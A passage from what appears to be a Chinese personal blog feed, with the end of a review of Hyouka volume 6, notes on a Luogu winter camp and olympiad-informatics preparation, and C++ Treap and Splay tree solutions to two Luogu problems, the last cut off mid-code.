提，第三部对四人的形象刻画很生动，个人很喜欢。）然而之所以一直念叨，想必也是因为本人不甘心——尽管那时里志也试着推理，不过他发现自己做不到。而在此，里志明显接受了自己没有折木那样的才能的事实，思想上已经做了转变，他依旧是那个在街机游戏中输了也笑得灿烂的里志。不过里志对公平正义的执着、对自己认为正确的事物的坚持从未改变。若非如此，他便不会为学弟打抱不平，便不会去请求折木解谜。变与不变，把里志形象刻画的极为鲜明。这个故事真正想要表达的是这样吧。<br>###故事2：《镜中不得见》<br>用摩耶花的视角探寻折木的过去——有意思的视角。早已疑惑摩耶花之前为什么会讨厌折木，本篇则进行了解答，毕竟古籍研究社系列向来是重点在于案件背后。他的初中同学们会讨厌他仅仅是因为一次误会，而折木选择了沉默。在摩耶花的好奇心驱使下，终于了解了折木所作所为的原因。在摩耶花道歉之后，折木看似漫不经心，但是一句“折木的视线游移不定”的描写展现了他内心的深受触动。这一篇故事刻画了折木做好事不留名的“英雄”形象，其实也侧面反映了折木本身并不消极。折木骨子里和里志是一样的，千反田只是唤醒了他的激情。个人认为此文涉及到了校园欺凌，从旁观者的角度出发展现了校园“冷暴力”的可怕。旁观者不应旁观。若直接介入不妥，暗中帮助不失为一种好方法——米泽穗信也许想传达的是这个。<br>不得见的，真的在镜中吗？<br>###故事3：《群山已放晴？》<br>折木探明了实际上不喜欢直升机的老师在某日早晨说出“我喜欢直升机”的缘由。看到一半的时候其实大部分人便都能模模糊糊猜到缘由了。当然重点依旧不在案件上。<br><strong>折木说出“我很好奇”</strong>的时候，无论里志、千反田、摩耶花还是读者都会大吃一惊吧。这则故事不长，像是一种过渡。然而说到过渡就会想到转变——节能主义的折木开始渴望本书中所说的“玫瑰色的人生”。某种程度上，折木已经放弃了节能主义。千反田是引子，根本动力是同里志一样的、内心深处对某些东西的执着和渴望。<br>我相信里志在整个系列中更像是折木的真我之体现。通过两人表现的差异，便能看出折木距离真正的自我还有多远。这是我对里志的理解：折木内心的镜像。<br>###故事4：《我们的传说之书》<br>摩耶花的视角。真相的揭示者就是“凶手”本人，十分有趣。本文探讨了一个问题：<strong>个体在集体之中，应该为了集体的利益而牺牲自己，还是应该为了自己的前途而放弃集体？</strong><br>河内学姐自己退出漫研，却安排羽仁担任社长，怎可谓放下？而其劝摩耶花退出也是为了漫研与摩耶花的利益最大化。现实生活往往不会出现故事中漫研完全两极分化的情况。无论做出什么选择，总有人要受伤。因此，我更倾向于遵循自己的本心。摩耶花的选择也许不一定正确，更有可能根本无对错之分，但她至少遵从了自己的本心。<br>###故事5：《悠长的假期》<br>这则故事详细说明了折木成为节能主义者的原因。故事的结尾借折木的姐姐之口说了这么一句话：<br><strong>“今后你会迎来悠长的假期，这样也好，你就好好休息吧，没问题，身体休息的时候，内心必须有所改变。”</strong><br>这里的“悠长假期”其实是<strong>一语三关</strong>，既实指折木即将迎来的漫长暑假，也暗指折木之后漫漫无期的节能主义生活，更指的是内心的缓慢改变。“身体休息的时候，内心必须有所改变”，暗喻了折木即将变成一个节能主义者，节能主义生活中内心却并不坚定，终将转变思想。故事最后又加了一句：“也会有人来结束你这悠长的假期。”说明暑假终将过去，节能主义的生活将不再，内心最终也会完成转变，更加成熟。米泽穗信刻意安排折木和千反田二人在这个故事里互动，传达着所谓的“有人”就是千反田，本文是官方发糖的铺垫之一。<br>###故事6：《迟来的翅膀》<br>不简单的一部书的最后一章，且标题和书的标题相同，暗示着其分量之重。米泽穗信更为用心地去刻画了人物形象。篇幅上稍长，故事的架构和立意更是高明，具备丰富的戏剧性和思想。前面几个故事都是在讲折木、福部和伊原，最后一个自然留给了千反田爱瑠。<br>“案件”的起因是有一天千反田的父亲突然告诉她不一定要再继承家业了。比喻为一道选择题的话，“不必须”就意味着即可用选继承家业，也可以选择不继承，因此在我们看来这实是一道开放的送分题，选择什么都可以，出路变多了，应该开心才对，在旁人看来千反田根本不必这么烦恼，然而在千反田眼中情况却并非如此。因为她不明白该不该用这迟来的翅膀展翅飞翔。<br>不禁想说小说读来总是弥漫着一种淡淡的苦涩（如同封底文字所说），远没有动画来的明快。第一部《冰菓》的I scream已经为整个系列奠定了基调。第一部书中千反田的舅舅关谷纯曾这样跟年幼的千反田解释“冰菓”：<br><strong>“是要变坚强的意思。如果软弱的话，总有一天会连悲鸣都发不出来。这样的话，就算活着，也只是行尸走肉。”</strong><br>作者借舅舅之口说这段话暗指的自然是身为家族继承人的千反田的某种命运，这也是为什么年幼的千反田在听完舅舅的这句话后就哭了。她内心一定是对自己“笼中鸟”的命运做过某种抗争的，但她认为这种抗争无法改变什么，于是就此放弃。然而有一天这件事真的成真了，这个时候千反田才发现自己并没有为此做过任何准备，甚至连这件事本身是不是自己真的想要的也要重新思考，这个时候才真正开始惶恐。<br>折木对这种心理有一个很有趣的比喻：好比有些不信耶稣的人唱赞歌会觉得别扭一样。原本没有自由的千反田能唱出憧憬自由的歌词，但当她真正有了自由后反而唱不出来了，看似矛盾，实则符合人物心境。正如故事的标题《迟来的翅膀》所想传达给我们的意义：笼中的鸟儿会憧憬自由，然而打开鸟笼后，它们却会因<strong>迟来的翅膀</strong>而恐惧。其实，本书的另一个译名<strong>“事到如今才叫我飞翔”</strong>更贴近原日文标题的直译，大可以体会一下个中含义。<br><strong>“这迟来的翅膀，让我不知所措。”</strong><br>千反田说出的这句话冲击力巨大。<br>忽然而至的自由，充满未知与可能性的人生，如此之大的冲击，必然动摇了千反田多年来作为千金千反田所存在的意义。即使我们不知道千反田原本愿意被继承人的身份束缚与否，也不知道她是否真的渴望自由，但能确定的是，她面对无限可能性时的迷茫绝不会持久。<br>故事在折木找到千反田后戛然而止，并没有给出答案，也就是说做出什么选择已经不重要了。因为这个命题不是我们每一个人需要思考的：**真正束缚我们的到底是什么？是无形的命运牢笼，还是对改变的恐惧？  **<br>这本书没有后记，再怎么看最后一页都只是冷冰冰的图书在版编目数据，我相信没有后记是因为米泽穗信希望最后这几段对话能久久留存在读者脑海，毕竟这部书相较于前几部很特别。<br>不过令人愉悦的是，此处古籍研究社系列的另一条线渐渐浮出：折木与千反田的关系。千反田引导了折木重新渴望玫瑰色的人生，动摇了折木“节能主义”的信条，成为了结束折木“悠长的假期”的那个人。可以说，折木已经喜欢上了她。既然千反田的迷茫不会持久，因为此次经历，千反田在此之后必然会和折木加深羁绊。请期待吧。<br>##PS……？：<br>说是校园推理的小说，但实际上许多探讨的事物一点也不校园，更不是为了推理而推理，更多的是对成长、社会、人生价值的思考。与其说是轻小说，我偏向于认为这是纯文学。<br>不管怎么说，我喜欢。<br>希望大家能分享一下关于这本书的感想吧。</h2><p>参考<a href="//www.zhihu.com/question/39576283/answer/82242206">耳朵读书 | 读《冰菓卷6·迟来的翅膀》有感</a><br>奉上很棒的评论：<a href="//www.zhihu.com/question/21576885/answer/29840285">如何评价《冰菓》这部动画？-Nasusu的回答</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 冰菓 </tag>
            
            <tag> 古籍研究社 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷冬令营随想</title>
      <link href="/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/"/>
      <url>/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>洛谷春令营结束不久，就我个人而言实在是收益良多。<br>课后与洛谷的讲师们略有交谈，并且稍微接触了别地的信竞生，顿感弱小……决定把一些了解到的信息和感想放在这里。比较杂，将就着看吧。  </p><hr><p>首先说下近年竞赛的发展吧。<br>近年信息学竞赛带来的升学优势增大了不少，机会增加了，这是好事。但这同样也意味着竞争将激烈许多。<br>举几个例子：  </p><ul><li>浙江小学便培育“种子选手”，浙江初赛分数线一度达到90分。  </li><li>著名的南山中学，C类买不停，此处不细说。  </li><li>很大一部分选手以完全停课备战比赛。</li></ul><p>切实参与到竞赛中，能感觉到许多学校已经为此疯狂了。究其原因是签约机会变多了。  </p><ul><li>NOIP获得极高分有几率提前签  </li><li>冬令营&#x2F;夏令营（WC&#x2F;SC）  </li><li>APIO  </li><li>省选  </li><li>NOI  </li><li>……</li></ul><p>C9大学竞相甩出了不少一本线录取的约。相比于裸考省TOP100（福建）才有希望进PKU&#x2F;THU，降至一本线录取无疑是捷径。难怪众多学校为其“疯狂”……<br>在我看到了雅礼中学、南山中学、福师大附中、福州三中、长郡中学、杭州二中等等强校的成绩后，我才发现我们已经落后太多了。好在初一起步，现在冲刺还有很大希望。  </p><hr><p>于是要注意什么呢？  </p><ol><li>持之以恒的练习。中考在即，许多人完全将C++甩开，全力备战中考。个人认为此举不妥。中考在6月下旬，然而11月份便是新一次NOIp了。如果3月~6月整整一个季度不写代码，绝对会手生了。此时想要回到从前的状态可能要很久。因此学业压力不大的可以考虑每天抽出时间想题、做题，周末打比赛。学习成绩不甚稳定的，每周也应该做个2、3题，保持感觉。其实现在看来我们只剩下2次NOIp的机会了，必须好好把握。  </li><li>有明确的TODO-List。信息学知识点比较繁杂，难度差异大，各种算法、数据结构比赛出现频率差距悬殊。于是在学习完某些内容之后，重点、热点趁热打铁，简单的运用几次。但是学习什么呢？可以参考《算法竞赛入门经典——训练指南》的目录。列出清单，逐一击破，此时再去刷综合题，效果一定好不少。  </li><li>多打比赛。一次次的比赛中，我们可以练好心态，学好骗分，把握节奏。随便去问一个大牛“去哪里打比赛好？”，95%的都会告诉你：Codeforces。其特色的赛制很能达到以上目的。如果没空怎么办呢（CF比赛多在深夜）？可以打洛谷的月赛，经过审核的公开赛。平常做题时，对于每道题，都应该使劲动脑，试着去使劲骗分，看看能得到多少（优秀的骗分往往能拿到70分以上，非常重要！比如模拟退火、爬山算法）。之后试图编写正解，30min没有明确思路，再去看题解。  </li><li>懂得总结套路。尤其是DP状态设计、DP优化、搜索剪枝……等等。刷题多了自然有经验，但是要善于总结。  </li><li>多接触他地市的选手、神犇，他们会很乐意帮助的。你甚至可以迅速的得到短期计划、大量内部材料……  </li><li>……</li></ol><hr><p>竞赛具体内容相关：<br>联赛常考：<br><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180228225459264-75959639.png">  </p><p>模拟题多是理所当然。但是DP的位置如此重要之前确实没想到，DP很看刷题量。数论需要一定的知识积累，初中生学起来可能较难，但是简单的手动找规律很有帮助。大部分比赛搜索枚举暴力写的好，剪枝剪得多就能直接Au。练好基本功很重要（所以多打比赛！）。<br>计算几何在省选、NOI中考的较多，不可不学。三维几何什么的就算了吧目前……<br>学会静态调试。先别急着输出中间变量，肉眼先仔细找找有没有错误，考场这样能有效提高效率，防止心态崩。<br>搜索枚举使劲剪枝，保证结果正确的情况下并且有充足时间使劲常数优化。竞赛中，好的常数优化有时胜过理论复杂度下降一个等级。<br>先写暴力，再写一般正解。这样还可以拿着2个程序挂后台对拍，既保证了基础得分，又为效率更高的方法提供了正确性保障。注意边界数据手动检验。<br>技巧可能有许多许多，此处是说不完的。在此推荐几个网站：<br>Codeforces.com<br>hzwer.com<br>顺带一提，洛谷的题解常常讲的比博客还好……<br>信息学竞赛贵在坚持，没有题量一切都是空谈，在机房里打游戏、逛知乎都是不妥的。<br>时间不多了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P2234  [HNOI2002]营业额统计</title>
      <link href="/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20%5BHNOI2002%5D%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/"/>
      <url>/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20%5BHNOI2002%5D%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>原题地址：<a href="//www.luogu.org/problemnew/show/P2234">https://www.luogu.org/problemnew/show/P2234</a></p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一个序列，对于每一个数都要查询：序列中在这个数前与这个数最接近的数是什么？然后将最接近的数字与这个数字的差累加。（序列第一个数字直接加自己）  </p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>查询在这个数之前与这个数最接近的数，我们很容易想到用二叉搜索树（BST）来做。<br><del>虽然数据略水暴力排序每次查询从一个数往左右找也能过。</del><br>每次插入一个数字，然后查询，我用Treap实现（还是弱化版的，只有插入查询）。<br>Treap的核心其实就是打乱顺序插入防止被卡（粗糙理解）。具体实现方法不难，请百度。（我之后会写一篇专门介绍下各种BST的。）<br>PS：Treap树完整版之后写。这题用STL的vector也行，vector理论每次插入渐进时间复杂度是O(n)但是听说实际是对数级别的？   </p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">randad</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed=<span class="number">114</span>; <span class="comment">//seed可以随便取</span></span><br><span class="line">    <span class="keyword">return</span> seed=<span class="built_in">int</span>(seed*<span class="number">48271LL</span>%<span class="number">2147483647</span>);<span class="comment">//48271使得其有完全周期，即2147483647内取遍不重复 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Treap</span> &#123;</span><br><span class="line">    <span class="type">int</span> key,pri,son[<span class="number">2</span>];</span><br><span class="line">&#125;T[<span class="number">33333</span>];</span><br><span class="line"><span class="type">int</span> cnt=<span class="number">1</span>,rt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> &amp;rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y=T[rt].son[p];</span><br><span class="line">    T[rt].son[p]=T[y].son[!p];</span><br><span class="line">    T[y].son[!p]=rt;</span><br><span class="line">    rt=y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> &amp;rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rt==<span class="number">0</span>)</span><br><span class="line">    T[rt=cnt++] = (Treap)&#123;key,<span class="built_in">randad</span>()&#125;;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> p=key&gt;T[rt].key;</span><br><span class="line">        <span class="built_in">ins</span>(key,T[rt].son[p]);</span><br><span class="line">        <span class="keyword">if</span>(T[T[rt].son[p]].pri&gt;T[rt].pri)</span><br><span class="line">        <span class="built_in">rotate</span>(p,rt);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nowMin</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> rt)</span><span class="comment">//查询现在最接近key的数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rt==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">666666666</span>;</span><br><span class="line">    <span class="type">int</span> res=<span class="built_in">abs</span>(key-T[rt].key);</span><br><span class="line">    <span class="keyword">if</span>(key&gt;T[rt].key) res=<span class="built_in">min</span>(res,<span class="built_in">nowMin</span>(key,T[rt].son[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T[rt].key) res=<span class="built_in">min</span>(res,<span class="built_in">nowMin</span>(key,T[rt].son[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n,tot=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) tot+=num;</span><br><span class="line">        <span class="keyword">else</span> tot+=<span class="built_in">nowMin</span>(num,rt);<span class="comment">//rt是当前根</span></span><br><span class="line">        <span class="built_in">ins</span>(num,rt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,tot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3391 【模板】文艺平衡树（Splay）</title>
      <link href="/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/"/>
      <url>/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="//www.luogu.org/problemnew/show/P3391">https://www.luogu.org/problemnew/show/P3391</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>您需要写一种数据结构（可参考题目标题），来维护一个有序数列，其中需要提供以下操作：<br>翻转一个区间，例如原有序序列是5 4 3 2 1，翻转区间是[2,4]的话，结果是5 2 3 4 1</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>Splay是一种二叉搜索树。如果不知道的话……    </p><p><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172651966-1911354100.png" alt="百度啊"><br>百度百科对BST的介绍：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二叉查找树（Binary Search Tree），（又：二叉搜索树，二叉排序树）它或者是一棵空树，或者是具有下列性质的二叉树： 若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉排序树。</span><br></pre></td></tr></table></figure><p>首先明白Splay比起线段树能多干什么：</p><ul><li>可以在一个有序序列中任意数后面动态插入一串数（不能比a后面一个数还大）  </li><li>可以删除一段区间</li></ul><p>可能描述不是很清楚，具体看这里面给的论文链接：<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">信息学竞赛相关优秀文章合集</a><br>或者直接看这里：<a href="//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf">运用伸展树解决数列维护问题.pdf</a><br>如果搞不懂左旋右旋是什么，可以先看<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">信息学竞赛相关优秀文章合集</a>里的AVL树介绍。<br>对于AVL树是一种为了防止树结构不够优导致深度过深时间复杂度退化，在保持二叉搜索树性质不变的前提下进行的一种变换。简单说就是把往一边沉的树弄的两边平衡些。<br>而在Splay中，将特定点旋转到一定位置可以进行提取区间等操作，同时各种旋转间接的使树**基本平衡(是的，可以构造数据卡掉。Treap树对此表示同情)**。  </p><hr><p>左旋（下面代码里的表达:把S往上转一次）→<img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235430206-1994690340.gif" alt="左旋">  </p><hr><p>右旋（下面代码里的表达:把E往上转一次）→<img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235503124-141509937.gif" alt="右旋">  </p><hr><p>图片来源：<a href="//blog.csdn.net/sun_tttt/article/details/65445754">http://blog.csdn.net/sun_tttt&#x2F;article&#x2F;details&#x2F;65445754</a><br>(文章是介绍红黑树的但是这个左旋右旋操作二叉搜索树通用)<br>论文里讲的很详细~<br>具体到这道题，引用一下zcysky在题解里给出的解释：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Splay可以用来维护序列。这样的话是把Splay当作一棵区间树。  </span><br><span class="line">所谓区间树和权值树的区别，大概就是区间树每个节点代表的是一段区间（典型代表就是一般的线段树）  </span><br><span class="line">权值树好理解一点，就是每个点真的代表一个点。  </span><br><span class="line">至于翻转操作我们可以利用Splay的过程实现。详见代码。(Splay能维护序列反转也是它作为LCT的辅助树的条件之一)</span><br></pre></td></tr></table></figure><p>作为模板题没什么好说的。这边文章主要记录板子用。感谢zcysky的板子。   </p><h2 id><a href="#" class="headerlink" title></a><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172902355-916514534.gif"></h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n,m; </span><br><span class="line"><span class="type">int</span> fa[N],ch[N][<span class="number">2</span>],size[N],rev[N],rt;<span class="comment">//fa[a]表示a的父亲</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//维护节点大小</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    size[x]=size[ch[x][<span class="number">0</span>]]+size[ch[x][<span class="number">1</span>]]+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//标记下传</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rev[x])&#123;<span class="comment">//是否翻转了区间</span></span><br><span class="line">        <span class="built_in">swap</span>(ch[x][<span class="number">0</span>],ch[x][<span class="number">1</span>]);</span><br><span class="line">        rev[ch[x][<span class="number">0</span>]]^=<span class="number">1</span>;rev[ch[x][<span class="number">1</span>]]^=<span class="number">1</span>;rev[x]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">isLeft</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="keyword">return</span> ch[fa[x]][<span class="number">0</span>] == x;&#125;<span class="comment">//判断x是不是左儿子</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> &amp;k)</span><span class="comment">//旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y=fa[x],z=fa[y];</span><br><span class="line"><span class="type">int</span> kind=<span class="built_in">isLeft</span>(x);</span><br><span class="line">    <span class="keyword">if</span>(y==k)</span><br><span class="line">        k=x;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ch[z][!<span class="built_in">isLeft</span>(y)]=x;</span><br><span class="line">    ch[y][!kind]=ch[x][kind];</span><br><span class="line">    </span><br><span class="line">    fa[ch[y][!kind]]=y;</span><br><span class="line">    ch[x][kind]=y;</span><br><span class="line">    fa[y]=x;fa[x]=z;</span><br><span class="line">    <span class="built_in">pushup</span>(x);<span class="built_in">pushup</span>(y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">splay</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> &amp;k)</span><span class="comment">//伸展操作，将x一直旋转直到x就是k</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x!=k)&#123;</span><br><span class="line">        <span class="type">int</span> y=fa[x],z=fa[y];</span><br><span class="line">        <span class="keyword">if</span>(y!=k)</span><br><span class="line">        <span class="built_in">isLeft</span>(x)^<span class="built_in">isLeft</span>(y) ? <span class="built_in">rotate</span>(x,k):<span class="built_in">rotate</span>(y,k);</span><br><span class="line"><span class="comment">//该节点与父亲分别是他们爸的左孩子\右孩子或者是右孩子\左孩子旋转2次x</span></span><br><span class="line"><span class="comment">//该节点与父亲同是他们爸的左孩子或同是右孩子先旋转一次y再旋转一次x</span></span><br><span class="line">        <span class="built_in">rotate</span>(x,k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> f)</span> <span class="comment">//建立一颗完全平衡的二叉树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> mid=(l+r)/<span 